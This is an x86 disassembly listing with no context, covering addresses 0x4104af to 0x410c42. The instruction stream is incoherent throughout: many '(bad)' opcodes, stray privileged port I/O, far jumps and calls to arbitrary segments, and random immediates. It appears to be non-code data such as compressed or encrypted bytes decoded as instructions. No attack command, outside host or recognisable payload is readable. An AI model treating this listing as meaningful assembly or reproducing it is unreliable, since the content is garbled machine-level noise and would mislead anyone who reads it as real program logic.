  4104af:	add    BYTE PTR [ebx],dl
  4104b1:	call   0xc41:0x427f3364
  4104b8:	dec    ecx
  4104b9:	add    BYTE PTR [eax],al
  4104bb:	mov    eax,ss
  4104bd:	add    BYTE PTR [eax],al
  4104bf:	(bad)  
  4104c0:	xor    DWORD PTR [ecx+0x58],edx
  4104c3:	mov    esp,0x29e31397
  4104c8:	mov    BYTE PTR [ebx],dh
  4104ca:	add    BYTE PTR [eax],al
  4104cc:	inc    eax
  4104cd:	loop   0x4104cf
  4104cf:	add    BYTE PTR [edx],bl
  4104d1:	imul   esi,DWORD PTR [esi-0x42f9c645],0x9
  4104d8:	sub    BYTE PTR [ebp-0x78],dh
  4104db:	das    
  4104dc:	add    BYTE PTR [eax],al
  4104de:	push   ebp
  4104df:	push   ebx
  4104e0:	jb     0x41046d
  4104e2:	jmp    0x410504
  4104e4:	call   0x7d0d67
  4104e9:	add    BYTE PTR [ebp-0x68006f67],bl
  4104ef:	pop    eax
  4104f0:	adc    al,0x14
  4104f2:	dec    ecx
  4104f3:	add    al,0x8e
  4104f5:	add    BYTE PTR [eax],al
  4104f7:	cmc    
  4104f8:	sub    ecx,DWORD PTR [esi]
  4104fa:	mov    ch,0xac
  4104fc:	data16 sub bl,al
  4104ff:	push   ds
  410500:	leave  
  410501:	xor    ch,BYTE PTR [esi-0x7a1e389b]
  410507:	es push es
  410509:	cmp    BYTE PTR [edi],bh
  41050b:	push   cs
  41050c:	into   
  41050d:	int3   
  41050e:	in     eax,dx
  41050f:	add    BYTE PTR [eax],al
  410511:	xor    edi,DWORD PTR [edx-0x20]
  410514:	pop    esi
  410515:	mov    ds:0x9b1d7f24,eax
  41051a:	das    
  41051b:	test   DWORD PTR [eax+eax*8],ebx
  41051e:	pop    eax
  41051f:	add    BYTE PTR [eax],al
  410521:	mov    WORD PTR [edi],cs
  410523:	add    BYTE PTR [eax],al
  410525:	jmp    0x138:0xe973a02a
  41052c:	lahf   
  41052d:	xchg   ebx,eax
  41052e:	loop   0x4105a0
  410530:	xor    al,0x3f
  410532:	mul    DWORD PTR [ecx+0x4a4a1629]
  410538:	jae    0x41055b
  41053a:	aam    0xc8
  41053c:	jno    0x41053e
  41053e:	add    BYTE PTR [ebx],dl
  410540:	cmp    al,0x8b
  410542:	jle    0x410593
  410544:	inc    esp
  410545:	fwait
  410546:	add    BYTE PTR [eax],al
  410548:	dec    eax
  410549:	in     al,0x0
  41054b:	add    cl,al
  41054d:	aaa    
  41054e:	rcr    eax,1
  410550:	xor    BYTE PTR [ecx],dl
  410552:	mov    ch,0x6d
  410554:	lss    esi,FWORD PTR [eax+0x7cc0eee9]
  41055b:	add    BYTE PTR [eax],al
  41055d:	lods   al,BYTE PTR ds:[esi]
  41055e:	inc    ebp
  41055f:	cmp    al,0xfb
  410561:	mov    bh,0x79
  410563:	jmp    ebx
  410565:	mov    ebx,0x36efa481
  41056a:	mov    al,ds:0xc752a3f
  41056f:	popa   
  410570:	add    BYTE PTR [eax],al
  410572:	push   ds
  410573:	ins    DWORD PTR es:[edi],dx
  410574:	sar    BYTE PTR [eax+eax*1-0x3283d000],0x36
  41057c:	push   esp
  41057d:	add    edx,DWORD PTR ds:0x2c135c97
  410583:	jmp    0x0:0x408a961
  41058a:	mov    edx,ebp
  41058c:	into   
  41058d:	or     al,0xe3
  41058f:	add    BYTE PTR [eax],al
  410591:	(bad)  
  410592:	jno    0x4105db
  410594:	sti    
  410595:	loope  0x41058c
  410597:	out    0xc8,al
  410599:	push   es
  41059a:	add    BYTE PTR [eax],al
  41059c:	mov    cl,0x1
  41059e:	inc    eax
  41059f:	fadd   DWORD PTR [eax]
  4105a1:	add    BYTE PTR [ebx],cl
  4105a3:	mov    ecx,0x14b6f98e
  4105a8:	push   edi
  4105a9:	mov    ecx,0x3b1e2568
  4105ae:	repz fdiv st,st(4)
  4105b1:	adc    BYTE PTR [edx-0x72100987],ah
  4105b7:	add    edx,DWORD PTR [ecx+0x49]
  4105ba:	(bad)  
  4105bb:	out    0x0,eax
  4105bd:	add    BYTE PTR [ebx+edx*1+0x179e99c],bl
  4105c4:	repz std 
  4105c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105c7:	pop    esp
  4105c8:	sub    DWORD PTR [edi+0x59cba722],esi
  4105ce:	retf   0xfa38
  4105d1:	aad    0x6e
  4105d3:	test   al,0xff
  4105d5:	das    
  4105d6:	cmp    eax,0xc6bc026a
  4105db:	enter  0xee,0x0
  4105df:	movlps QWORD PTR [ecx-0x39153eba],xmm7
  4105e6:	rol    DWORD PTR [ebx+0x14],0xa
  4105ea:	mov    WORD PTR [eax],?
  4105ec:	add    BYTE PTR [eax],al
  4105ee:	jmp    0xe955:0xecf87915
  4105f5:	jle    0x4105a7
  4105f7:	add    esi,esp
  4105f9:	ja     0x4105c4
  4105fb:	or     dh,BYTE PTR [ebx+0x23]
  4105fe:	inc    ebp
  4105ff:	gs xor al,0xb1
  410602:	lahf   
  410603:	or     DWORD PTR [ebx-0x4e65d34b],esi
  410609:	sub    esi,ebx
  41060b:	jmp    DWORD PTR [eax+0x2f52dcc1]
  410611:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410612:	and    eax,0x60caa7b7
  410617:	in     al,dx
  410618:	xor    al,BYTE PTR [ebx+eiz*8+0x0]
  41061c:	add    BYTE PTR [edx],ah
  41061e:	push   cs
  41061f:	sub    DWORD PTR [edx-0x1b7fdac2],0x50570000
  410629:	add    eax,0xabe0b06e
  41062e:	mov    eax,ds:0xef0c1e43
  410633:	add    BYTE PTR [eax],al
  410635:	jb     0x41066e
  410637:	popa   
  410638:	pop    es
  410639:	dec    ebp
  41063a:	stos   BYTE PTR es:[edi],al
  41063b:	test   eax,0x4c4df4e9
  410640:	sub    al,BYTE PTR [eax]
  410642:	add    BYTE PTR [ecx+eax*2+0x0],al
  410646:	add    BYTE PTR [edx-0x77392f22],ah
  41064c:	out    0x0,eax
  41064e:	add    BYTE PTR [eax+edi*8-0x2c24132a],bh
  410655:	or     BYTE PTR [ecx+0x0],bh
  410658:	add    BYTE PTR ds:0x3eccd7cd,ah
  41065e:	add    BYTE PTR [eax],al
  410660:	add    ah,bh
  410662:	add    BYTE PTR [eax],al
  410664:	mov    BYTE PTR [eax],ah
  410666:	add    BYTE PTR [eax],al
  410668:	js     0x410633
  41066a:	mov    bh,0xfe
  41066c:	pop    ebp
  41066d:	stos   DWORD PTR es:[edi],eax
  41066e:	into   
  41066f:	and    eax,0x68e513f5
  410674:	add    esi,edx
  410676:	add    BYTE PTR [ebp+0x5c],0x8f
  41067a:	jmp    0xe76d:0x9a75be6b
  410681:	adc    cl,BYTE PTR [esi+0x753bd451]
  410687:	ins    BYTE PTR es:[edi],dx
  410688:	stos   DWORD PTR es:[edi],eax
  410689:	mov    bl,0xa9
  41068b:	int    0x6f
  41068d:	inc    eax
  41068e:	cmp    al,0x0
  410690:	add    BYTE PTR [ebp+0x3e],bl
  410693:	out    dx,al
  410694:	test   eax,0x490f54ac
  410699:	popa   
  41069a:	cmp    al,BYTE PTR [eax+ecx*4]
  41069d:	add    BYTE PTR [eax],al
  41069f:	xchg   ebp,eax
  4106a0:	(bad)  
  4106a1:	mov    dh,0x5
  4106a3:	pusha  
  4106a4:	call   DWORD PTR [edx]
  4106a6:	pop    ss
  4106a7:	icebp  
  4106a8:	push   ss
  4106a9:	fs pop edx
  4106ab:	mov    edi,0x35e2392c
  4106b0:	or     DWORD PTR [ebp-0x31],0x77
  4106b4:	lds    edi,FWORD PTR [ecx+edi*4+0x69b09bdc]
  4106bb:	adc    DWORD PTR [eax],0xcafee728
  4106c1:	add    eax,0xcee6d36b
  4106c6:	jmp    0x41073e
  4106c8:	push   ds
  4106c9:	into   
  4106ca:	test   al,0x69
  4106cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106cd:	sbb    cl,ch
  4106cf:	xchg   DWORD PTR [esi+edi*2],ebx
  4106d2:	fst    QWORD PTR [ebp-0x48]
  4106d5:	mov    ebx,DWORD PTR [ecx]
  4106d7:	(bad)  
  4106d8:	adc    eax,0xf83410a6
  4106dd:	adc    esi,DWORD PTR [ecx+0x122f016d]
  4106e3:	rol    ah,cl
  4106e5:	inc    esp
  4106e6:	add    BYTE PTR [eax],al
  4106e8:	sub    DWORD PTR [edx+0x18],esp
  4106eb:	or     esi,DWORD PTR [esi]
  4106ed:	push   0x4259453b
  4106f2:	fucom  st(2)
  4106f4:	mov    al,0xea
  4106f6:	jnp    0x4106d7
  4106f8:	and    dh,BYTE PTR [ecx+0x19]
  4106fb:	mov    eax,0xe777d9c9
  410700:	dec    edx
  410701:	pop    ebp
  410702:	sub    dl,0x0
  410705:	add    BYTE PTR [esi],al
  410707:	mov    fs,ebx
  410709:	mov    bh,0xc1
  41070b:	call   0xd790:0xc63a6e8b
  410712:	push   edi
  410713:	imul   edx,esi,0x27
  410716:	cs jnp 0x410766
  410719:	outs   dx,BYTE PTR ds:[esi]
  41071a:	sbb    DWORD PTR [edi+0x26c0b5ba],esi
  410720:	add    BYTE PTR [eax],al
  410722:	mov    esi,?
  410724:	add    BYTE PTR [eax],al
  410726:	push   0x33
  410728:	xchg   ecx,eax
  410729:	(bad)  
  41072a:	sub    BYTE PTR [edx],al
  41072c:	push   ebx
  41072d:	jecxz  0x4106d8
  41072f:	out    dx,al
  410730:	add    ebp,ecx
  410732:	hlt    
  410733:	mov    ah,0x50
  410735:	and    al,0x2a
  410737:	test   ecx,0x48a2eb4
  41073d:	daa    
  41073e:	add    BYTE PTR [eax],al
  410740:	stos   DWORD PTR es:[edi],eax
  410741:	pop    ebx
  410742:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410743:	adc    BYTE PTR [ebp-0x3f03addc],dl
  410749:	stc    
  41074a:	add    BYTE PTR [eax],al
  41074c:	add    dh,BYTE PTR [eax]
  41074e:	adc    dh,BYTE PTR [eax+0x755e2f51]
  410754:	out    dx,eax
  410755:	mov    DWORD PTR [esi+0xb6c48f],0x2ee05100
  41075f:	cld    
  410760:	adc    BYTE PTR [edi+0x26],ah
  410763:	pop    esp
  410764:	fisub  DWORD PTR [ebx+0x7f]
  410767:	xchg   bh,bh
  410769:	into   
  41076a:	dec    ebx
  41076b:	pop    ecx
  41076c:	fwait
  41076d:	scas   eax,DWORD PTR es:[edi]
  41076e:	int    0x9e
  410770:	in     al,dx
  410771:	loop   0x41071d
  410773:	mov    DWORD PTR [esp+ecx*1],ebp
  410776:	mov    edi,0x90040000
  41077b:	add    BYTE PTR [eax],al
  41077d:	stc    
  41077e:	(bad)  
  41077f:	jbe    0x4107d1
  410781:	push   esi
  410782:	jne    0x410718
  410784:	mov    ebp,0x6b2424d
  410789:	add    bh,0x0
  41078c:	add    BYTE PTR [ebp+0x66],dl
  41078f:	int3   
  410790:	mov    ds:0x83bb0000,al
  410795:	or     DWORD PTR [edi],edx
  410797:	add    al,0x9c
  410799:	add    BYTE PTR [eax],al
  41079b:	jecxz  0x4107c3
  41079d:	mov    esi,0x86104ee5
  4107a2:	mov    edi,0x4eaf2245
  4107a7:	mov    eax,0x7cbd0325
  4107ac:	mov    al,ds:0x850843
  4107b1:	add    BYTE PTR [ecx-0x37],cl
  4107b4:	sbb    eax,edx
  4107b6:	push   esp
  4107b7:	mov    dl,0xe4
  4107b9:	fs into 
  4107bb:	xlat   BYTE PTR ds:[ebx]
  4107bc:	or     BYTE PTR [eax+0x0],al
  4107bf:	add    BYTE PTR [ebx],dl
  4107c1:	push   ss
  4107c2:	test   edx,ebx
  4107c4:	pop    es
  4107c5:	pop    ebp
  4107c6:	adc    esi,esi
  4107c8:	ja     0x410821
  4107ca:	xchg   ebx,eax
  4107cb:	pusha  
  4107cc:	xor    eax,0xf4f3792b
  4107d1:	cmp    BYTE PTR [eax+eax*4-0x5ffff54],ch
  4107d8:	add    bh,BYTE PTR [ebx]
  4107da:	sbb    DWORD PTR [ebx+0x49e52c2b],edi
  4107e0:	jmp    0x23b47ab8
  4107e5:	sti    
  4107e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107e7:	push   0xf7a5b945
  4107ec:	cmp    BYTE PTR [edi],dl
  4107ee:	icebp  
  4107ef:	outs   dx,BYTE PTR ds:[esi]
  4107f0:	sahf   
  4107f1:	jbe    0x410794
  4107f3:	repnz xor al,0x5a
  4107f6:	dec    edx
  4107f7:	xchg   ecx,eax
  4107f8:	call   FWORD PTR [ebp-0x4b]
  4107fb:	cmp    DWORD PTR [eax+0x50],esp
  4107fe:	mov    ch,BYTE PTR [ebp-0x74f15d7e]
  410804:	jae    0x41082a
  410806:	push   edi
  410807:	sbb    al,0x12
  410809:	xor    eax,0xce1d55b0
  41080e:	push   edi
  41080f:	xchg   esp,eax
  410810:	adc    al,0x75
  410812:	fld    TBYTE PTR cs:[ebx]
  410815:	(bad)  [ebx+esi*4-0xea8d7c8]
  41081c:	scas   al,BYTE PTR es:[edi]
  41081d:	push   cs
  41081e:	push   es
  41081f:	ja     0x41080d
  410821:	and    ah,0x0
  410824:	add    BYTE PTR [eax],cl
  410826:	pushf  
  410827:	add    BYTE PTR [eax],al
  410829:	xchg   esp,eax
  41082a:	adc    cl,BYTE PTR [eax]
  41082c:	stos   DWORD PTR es:[edi],eax
  41082d:	add    BYTE PTR [eax],al
  41082f:	or     al,0xc1
  410831:	add    BYTE PTR [eax],al
  410833:	pop    ds
  410834:	fmulp  st(2),st
  410836:	fcomp  DWORD PTR [ebx]
  410838:	cs (bad) 
  41083a:	scas   al,BYTE PTR es:[edi]
  41083b:	(bad)  
  41083c:	in     eax,0x11
  41083e:	mov    ds:0x8c2245aa,eax
  410843:	jae    0x410845
  410845:	add    BYTE PTR [edx],ah
  410847:	fwait
  410848:	add    DWORD PTR [ecx],ecx
  41084a:	and    ebx,DWORD PTR [edx-0x43]
  41084d:	ja     0x41087a
  41084f:	dec    esp
  410850:	mov    esi,0x2f270000
  410855:	cli    
  410856:	daa    
  410857:	xchg   BYTE PTR [edx],dl
  410859:	mov    bl,0x84
  41085b:	fild   DWORD PTR [eax]
  41085d:	add    al,ch
  41085f:	inc    ebp
  410860:	ror    BYTE PTR [ebx+edx*2+0x70100000],cl
  410867:	out    0x60,al
  410869:	iret   
  41086a:	lods   eax,DWORD PTR ds:[esi]
  41086b:	daa    
  41086c:	mov    eax,0x9fb4d96c
  410871:	push   ecx
  410872:	xlat   BYTE PTR ds:[ebx]
  410873:	call   0xceec1e75
  410878:	aad    0xe7
  41087a:	pop    edi
  41087b:	jbe    0x410806
  41087d:	daa    
  41087e:	ds pushf 
  410880:	sar    ch,0x0
  410883:	add    BYTE PTR [edi],bl
  410885:	(bad)  
  410886:	cmp    al,0xc4
  410888:	and    BYTE PTR [eax],al
  41088a:	add    BYTE PTR [ebx-0x5f2f324d],dl
  410890:	mov    cl,0xc0
  410892:	xchg   esi,eax
  410893:	add    BYTE PTR [eax],al
  410895:	in     al,dx
  410896:	mov    esp,0xbc1fcd4f
  41089b:	(bad)  
  41089c:	xchg   ebx,eax
  41089d:	dec    edi
  41089e:	push   ebx
  41089f:	mov    ds:0x51d71893,eax
  4108a4:	jecxz  0x410843
  4108a6:	aam    0xa3
  4108a8:	dec    esp
  4108a9:	test   DWORD PTR [eax],0xb2968700
  4108af:	dec    ecx
  4108b0:	mov    edi,DWORD PTR [esi+esi*1-0x4284dd99]
  4108b7:	mov    al,ds:0x75913cd1
  4108bc:	sti    
  4108bd:	rol    BYTE PTR [edi+0x2c],1
  4108c0:	cs stos BYTE PTR es:[edi],al
  4108c2:	mov    al,0x13
  4108c4:	jnp    0x410945
  4108c6:	mov    ch,0xb4
  4108c8:	mov    esi,0xcccb5838
  4108cd:	xchg   esi,eax
  4108ce:	add    BYTE PTR [eax],al
  4108d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108d1:	out    dx,al
  4108d2:	add    dl,BYTE PTR [bp+0x510e]
  4108d7:	clc    
  4108d8:	pop    esp
  4108d9:	nop
  4108da:	xor    DWORD PTR [esi+0x63],ebp
  4108dd:	popa   
  4108de:	xchg   edi,eax
  4108df:	inc    ecx
  4108e0:	and    bh,BYTE PTR [ecx]
  4108e2:	dec    ebp
  4108e3:	ins    BYTE PTR es:[edi],dx
  4108e4:	ins    BYTE PTR es:[edi],dx
  4108e5:	sti    
  4108e6:	nop
  4108e7:	lahf   
  4108e8:	je     0x41089c
  4108ea:	popf   
  4108eb:	outs   dx,BYTE PTR ds:[esi]
  4108ec:	into   
  4108ed:	mov    eax,0x3580adb
  4108f2:	stos   BYTE PTR es:[edi],al
  4108f3:	mov    ch,0x84
  4108f5:	jge    0x4108f7
  4108f7:	add    BYTE PTR [esi+ebp*8],dl
  4108fa:	stc    
  4108fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108fc:	cs push esp
  4108fe:	pop    eax
  4108ff:	popa   
  410900:	gs sbb eax,0xc49bdfa1
  410906:	inc    ebp
  410907:	add    BYTE PTR [eax],al
  410909:	les    eax,FWORD PTR [ecx+0x0]
  41090c:	add    bl,ch
  41090e:	xor    BYTE PTR [ebp+0x58],0xa1
  410912:	repnz mov ebx,0x8500
  410918:	push   0x7d
  41091a:	or     bh,ah
  41091c:	les    ebx,FWORD PTR [eax+0x58220000]
  410922:	test   eax,0x7bea3d8f
  410927:	shl    DWORD PTR [esi-0x68f0d8d9],0x68
  41092e:	jmp    FWORD PTR [esi-0x15]
  410931:	or     ecx,ecx
  410933:	adc    ah,BYTE PTR [ebp-0x227b89e4]
  410939:	add    BYTE PTR [eax],al
  41093b:	loop   0x41094d
  41093d:	or     eax,0xfa7374b4
  410942:	push   0xffffffb8
  410944:	cwde   
  410945:	aam    0x36
  410947:	dec    esi
  410948:	int3   
  410949:	fild   WORD PTR [eax]
  41094b:	add    bl,ch
  41094d:	daa    
  41094e:	sub    BYTE PTR [esi],bl
  410950:	into   
  410951:	loop   0x4109b6
  410953:	xor    DWORD PTR [ebp-0x5ce95bfa],ecx
  410959:	push   eax
  41095a:	lock xor edi,DWORD PTR [esi-0x33]
  41095e:	ror    BYTE PTR [edx+0x0],0x0
  410962:	adc    al,BYTE PTR [ebx+0x4ab82df7]
  410968:	dec    eax
  410969:	icebp  
  41096a:	add    BYTE PTR [eax],al
  41096c:	jbe    0x4109ac
  41096e:	js     0x410961
  410970:	shl    DWORD PTR [esi+0x8cef024],cl
  410976:	or     eax,0xd81a0000
  41097b:	out    0xde,al
  41097d:	cld    
  41097e:	and    DWORD PTR [ecx],edi
  410980:	ror    BYTE PTR [eax],1
  410982:	hlt    
  410983:	add    BYTE PTR [eax],al
  410985:	scas   al,BYTE PTR es:[edi]
  410986:	test   eax,0x269b835d
  41098b:	je     0x41091c
  41098d:	jno    0x4109db
  41098f:	in     eax,dx
  410990:	add    BYTE PTR [eax],al
  410992:	(bad)  
  410993:	mov    BYTE PTR [eax],0x0
  410996:	mov    ebp,0xc6a0d6d4
  41099b:	into   
  41099c:	and    bh,dl
  41099e:	and    eax,0x5ed586c9
  4109a3:	shr    DWORD PTR [ebx],cl
  4109a5:	(bad)
  4109a8:	dec    esi
  4109a9:	aas    
  4109aa:	mov    ebx,0x7be030b0
  4109af:	and    DWORD PTR [esi+0x5],ebp
  4109b2:	aaa    
  4109b3:	mov    DWORD PTR [esi-0x57f399cc],0xad80000
  4109bd:	icebp  
  4109be:	retf   
  4109bf:	mov    BYTE PTR [esi+0x215e0000],dh
  4109c5:	imul   edx,DWORD PTR [ebp+0x565315e0],0x9b8166f1
  4109cf:	(bad)  
  4109d0:	scas   al,BYTE PTR es:[edi]
  4109d1:	mov    dl,0xf4
  4109d3:	rcl    DWORD PTR [eax],1
  4109d5:	push   ecx
  4109d6:	repz std 
  4109d8:	in     al,0xd5
  4109da:	sahf   
  4109db:	outs   dx,BYTE PTR ds:[esi]
  4109dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109dd:	mov    dh,ah
  4109df:	js     0x410985
  4109e1:	into   
  4109e2:	test   eax,0x8888
  4109e7:	add    ecx,esp
  4109e9:	dec    esp
  4109ea:	add    BYTE PTR [eax],al
  4109ec:	ins    BYTE PTR es:[edi],dx
  4109ed:	out    dx,eax
  4109ee:	pushf  
  4109ef:	out    0xfb,eax
  4109f1:	retf   
  4109f2:	sub    DWORD PTR ds:0xa868df7e,esi
  4109f8:	shr    ah,1
  4109fa:	xrelease xchg BYTE PTR [esi],ch
  4109fd:	inc    edx
  4109fe:	sahf   
  4109ff:	xor    eax,0x53bee4fd
  410a04:	mov    ?,edi
  410a06:	xor    al,0x7c
  410a08:	sahf   
  410a09:	in     al,0x74
  410a0b:	int    0xf1
  410a0d:	outs   dx,BYTE PTR gs:[esi]
  410a0f:	adc    edi,DWORD PTR [ebp+0x1b]
  410a12:	bound  esi,QWORD PTR [eax-0x78]
  410a15:	push   esp
  410a16:	add    BYTE PTR [eax],al
  410a18:	mov    ebx,DWORD PTR [ebp+eax*2+0x19]
  410a1c:	ficomp DWORD PTR [ebx+0x4a0c5e]
  410a22:	add    BYTE PTR [eax+0x64c37c4d],bl
  410a28:	rcl    BYTE PTR [edi],0x0
  410a2b:	add    BYTE PTR [ebx+0x2ec4],al
  410a31:	test   eax,0x74c8e1a4
  410a36:	add    BYTE PTR [eax],al
  410a38:	(bad)  
  410a39:	lock into 
  410a3b:	cmp    al,BYTE PTR [eax-0x21]
  410a3e:	add    BYTE PTR [eax],al
  410a40:	shr    DWORD PTR [esi+0x9],0xba
  410a44:	mov    dh,BYTE PTR [ecx-0x7f52e51c]
  410a4a:	jle    0x410a4c
  410a4c:	add    bl,al
  410a4e:	inc    eax
  410a4f:	inc    esi
  410a50:	add    BYTE PTR [eax],al
  410a52:	mov    al,0x0
  410a54:	push   edx
  410a55:	add    BYTE PTR [eax],al
  410a57:	mov    ebp,0x936223be
  410a5c:	push   0x470154a6
  410a61:	mov    ah,0xd1
  410a63:	and    dl,dh
  410a65:	lods   al,BYTE PTR ds:[esi]
  410a66:	push   es
  410a67:	jno    0x410a26
  410a69:	mov    eax,ds:0x8c8eb25
  410a6e:	add    BYTE PTR [eax],al
  410a70:	add    al,0xdb
  410a72:	add    BYTE PTR [eax],al
  410a74:	push   ecx
  410a75:	cmp    al,0x38
  410a77:	add    BYTE PTR [edx+0x772b0000],bl
  410a7d:	int    0x37
  410a7f:	jnp    0x410a82
  410a81:	adc    DWORD PTR [edx+0x90c4b1],ebx
  410a87:	add    ah,bl
  410a89:	xchg   esi,eax
  410a8a:	inc    eax
  410a8b:	pop    esi
  410a8c:	add    BYTE PTR [eax],al
  410a8e:	push   es
  410a8f:	lods   eax,DWORD PTR ds:[esi]
  410a90:	push   edx
  410a91:	call   0xbec4ce26
  410a96:	lods   eax,DWORD PTR ds:[esi]
  410a97:	imul   edx,DWORD PTR [ecx],0x71
  410a9a:	mov    ds:0x272af224,al
  410a9f:	fld    QWORD PTR [ebx]
  410aa1:	mov    WORD PTR ds:0xafd30000,cs
  410aa7:	pop    es
  410aa8:	out    0x8d,eax
  410aaa:	lods   eax,DWORD PTR ds:[esi]
  410aab:	int    0xd3
  410aad:	outs   dx,DWORD PTR ds:[esi]
  410aae:	dec    edx
  410aaf:	std    
  410ab0:	mov    dh,0xc8
  410ab2:	cdq    
  410ab3:	add    BYTE PTR [eax],al
  410ab5:	push   ebp
  410ab6:	xchg   ecx,eax
  410ab7:	and    ebp,edx
  410ab9:	mov    eax,ss
  410abb:	add    BYTE PTR [eax],al
  410abd:	cmp    dl,BYTE PTR [edi]
  410abf:	(bad)  
  410ac0:	pop    eax
  410ac1:	xlat   BYTE PTR ds:[ebx]
  410ac2:	mov    bh,BYTE PTR [ebx]
  410ac4:	xor    DWORD PTR [edx-0x77],ebx
  410ac7:	retf   
  410ac8:	stc    
  410ac9:	cmc    
  410aca:	fs je  0x410a78
  410acd:	in     eax,0xdb
  410acf:	js     0x410aa9
  410ad1:	out    dx,al
  410ad2:	or     dl,BYTE PTR [ebp+0x560416]
  410ad8:	add    BYTE PTR [edi+0x18edf7fd],dl
  410ade:	sub    ebp,DWORD PTR [ebp+0x2]
  410ae1:	pushf  
  410ae2:	pop    edx
  410ae3:	pop    ds
  410ae4:	mov    dl,0xb8
  410ae6:	or     BYTE PTR [eax+eax*1-0x46231800],al
  410aed:	or     DWORD PTR [ebp-0x70],0x42
  410af1:	imul   esi,DWORD PTR [edi+0x484351fd],0xffffff96
  410af8:	add    BYTE PTR [eax],al
  410afa:	test   edi,esi
  410afc:	pop    edi
  410afd:	xchg   ch,dh
  410aff:	mov    ss,esi
  410b01:	jecxz  0x410abc
  410b03:	popa   
  410b04:	cli    
  410b05:	(bad)  
  410b06:	sub    ebp,DWORD PTR [edi+0x4d]
  410b09:	add    BYTE PTR [ecx+0x28fe0000],ah
  410b0f:	add    eax,0x9f79e63e
  410b14:	and    edx,DWORD PTR [esi+esi*4+0x471a1dfa]
  410b1b:	mov    eax,0xf2b339a2
  410b20:	adc    edx,DWORD PTR [edi-0x3b06cd0d]
  410b26:	pop    edi
  410b27:	add    BYTE PTR [eax],al
  410b29:	pusha  
  410b2a:	lods   al,BYTE PTR ds:[esi]
  410b2b:	iret   
  410b2c:	push   eax
  410b2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b2e:	retf   
  410b2f:	das    
  410b30:	in     eax,0x7b
  410b32:	and    eax,0xfbf40618
  410b37:	test   DWORD PTR [esi-0x29],esi
  410b3a:	sahf   
  410b3b:	cdq    
  410b3c:	xchg   ecx,eax
  410b3d:	retf   
  410b3e:	xchg   esi,eax
  410b3f:	or     al,0x4a
  410b41:	add    BYTE PTR [eax],al
  410b43:	sbb    BYTE PTR [eax+0x858c],ch
  410b49:	arpl   WORD PTR [esp+ebp*4],cx
  410b4c:	add    BYTE PTR [eax],al
  410b4e:	shr    DWORD PTR [edx],1
  410b50:	xchg   edx,eax
  410b51:	(bad)
  410b54:	in     al,dx
  410b55:	(bad)  
  410b56:	mov    ebp,0x7c510b36
  410b5b:	xlat   BYTE PTR ds:[ebx]
  410b5c:	mov    BYTE PTR [eax+0x0],al
  410b5f:	add    ah,ch
  410b61:	fbstp  TBYTE PTR [ebx+0x55]
  410b64:	push   cs
  410b65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b66:	add    eax,0x6be15290
  410b6b:	call   FWORD PTR [ebp+0x45ebeb6]
  410b71:	push   ecx
  410b72:	add    BYTE PTR [eax],al
  410b74:	repz jbe 0x410bda
  410b77:	xor    DWORD PTR [ebp-0x1b],eax
  410b7a:	scas   eax,DWORD PTR es:[edi]
  410b7b:	in     al,dx
  410b7c:	paddusw mm3,mm3
  410b7f:	add    ah,dh
  410b81:	add    BYTE PTR [eax],al
  410b83:	mov    esp,0x91f9bdb5
  410b88:	repnz pop esp
  410b8a:	sub    bh,cl
  410b8c:	mov    esi,DWORD PTR [eax+ecx*2]
  410b8f:	and    BYTE PTR [eax],al
  410b91:	add    BYTE PTR [edx],bl
  410b93:	and    DWORD PTR [edi-0x20],esi
  410b96:	inc    ebp
  410b97:	test   al,0xf1
  410b99:	mov    ebx,DWORD PTR [edi+0xaf4c]
  410b9f:	jecxz  0x410bdb
  410ba1:	ins    BYTE PTR es:[edi],dx
  410ba2:	int3   
  410ba3:	inc    DWORD PTR [eax]
  410ba5:	add    BYTE PTR [ebx],cl
  410ba7:	cmp    BYTE PTR [ecx-0x32946de7],ah
  410bad:	imul   BYTE PTR [ebx+0x4b88]
  410bb3:	test   DWORD PTR [esi+edx*1],esi
  410bb6:	pop    es
  410bb7:	lds    esp,FWORD PTR ds:0x4f9d1287
  410bbd:	sti    
  410bbe:	jne    0x410c19
  410bc0:	retf   0xc097
  410bc3:	pop    edx
  410bc4:	add    BYTE PTR [eax],al
  410bc6:	lahf   
  410bc7:	sub    eax,0xa4d18719
  410bcc:	adc    BYTE PTR [eax+esi*4+0x679fb3ee],ah
  410bd3:	mov    cl,0x80
  410bd5:	xor    eax,0x8b350000
  410bda:	lods   al,BYTE PTR ds:[esi]
  410bdb:	jo     0x410c0c
  410bdd:	add    DWORD PTR [edi+esi*8+0x2da10000],0xffffffda
  410be5:	outs   dx,DWORD PTR ds:[esi]
  410be6:	push   ss
  410be7:	push   ebp
  410be8:	mov    al,ds:0x47cc
  410bed:	out    dx,eax
  410bee:	xchg   ebx,eax
  410bef:	pop    ebp
  410bf0:	lahf   
  410bf1:	pusha  
  410bf2:	pop    edi
  410bf3:	push   es
  410bf4:	test   al,bl
  410bf6:	add    BYTE PTR [eax],al
  410bf8:	mov    edx,esi
  410bfa:	(bad)
  410bfe:	loopne 0x410c0a
  410c00:	mov    ds:0x76b442be,al
  410c05:	pop    edi
  410c06:	mov    edx,ebx
  410c08:	push   ss
  410c09:	bound  edx,QWORD PTR [esi]
  410c0b:	lock add dl,BYTE PTR [edx-0x54]
  410c0f:	mov    BYTE PTR [eax+0x0],al
  410c12:	add    BYTE PTR [ecx+0x18659611],cl
  410c18:	retf   
  410c19:	dec    esi
  410c1a:	mov    cl,0xe5
  410c1c:	stc    
  410c1d:	sbb    BYTE PTR [edx-0x41184c4f],bh
  410c23:	xor    BYTE PTR [ebx],ch
  410c25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c26:	dec    ebx
  410c27:	or     eax,0xeaf29e15
  410c2c:	mov    dh,0xaa
  410c2e:	mov    ebx,0xca1ca9df
  410c33:	sbb    bl,BYTE PTR [eax+0x290c6b]
  410c39:	add    BYTE PTR [ebx-0x4cf7105a],bh
  410c3f:	add    BYTE PTR [eax],al
  410c41:	hlt    
  410c42:	and    BYTE PTR [eax+0x0],0x0
